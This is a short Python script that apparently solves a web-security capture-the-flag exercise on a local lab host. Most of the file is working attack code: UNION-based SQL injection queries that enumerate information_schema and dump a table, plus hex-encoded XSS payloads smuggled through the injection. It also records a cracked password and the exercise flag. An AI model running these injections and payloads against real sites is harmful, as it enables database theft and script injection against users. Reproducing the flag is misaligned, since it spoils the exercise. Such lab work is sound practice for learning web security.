import hashlib

import requests
from lxml import etree


def get_page(id_):
    url = f"http://192.168.122.213/index.php?page=searchimg&id={id_}&Submit=Submit"
    r = requests.get(url)
    return r.text

def parse_html(html):
    root = etree.HTML(html)
    return root.xpath('//pre/text()')

def enumerate_members():
    for i in range(1, 100):
        parsed = parse_html(get_page(i))
        if parsed:
            print(parsed)

def inject_sql(sql):
    print("Injecting SQL:", sql)
    res = parse_html(get_page(sql))
    if len(res) == 1:
        print(f"Error: {res[0]}")
        return
    for r in res:
        print(r)
        if r.startswith("First name: "):
            print(r)




if __name__ == "__main__":
    # sql = """1 UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT_WS(0x3A, table_schema, table_name) SEPARATOR 0x0A) AS all_tables FROM information_schema.tables"""
    sql_template = "1 UNION SELECT CONCAT_WS(0x3A, {}), NULL FROM {} --"
    # sql = sql_template.format("table_name, column_name", "information_schema.columns")
    # inject_sql(f"{sql}")
    # 
    sql = sql_template.format("id, url, title, comment", "list_images")
    inject_sql(f"{sql}")
    #
    # sql = sql_template.format("table_schema, table_name", "information_schema.tables")
    # inject_sql(f"{sql}")
    #
    # sql = sql_template.format("table_name", "Member_Brute_Force")
    # inject_sql(f"{sql}")
    # payload = "<script>alert(xss)</script>"
    # payload = "<script>alert(1)</script>"
    payload = "<img src=borntosec.ddns.net/images.png>"
    numbers = [ord(c) for c in payload]
    hex_numbers = [hex(c) for c in numbers]
    sql = f"1 UNION SELECT CONCAT({' ,'.join(hex_numbers)}), NULL --"
    print(sql)

    # "https://crackstation.net/" to decript password
    decrypted = "albatroz"
    decrypted = decrypted.lower()
    sha256 = hashlib.sha256(decrypted.encode()).hexdigest()
    print(sha256)
    # flag is f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188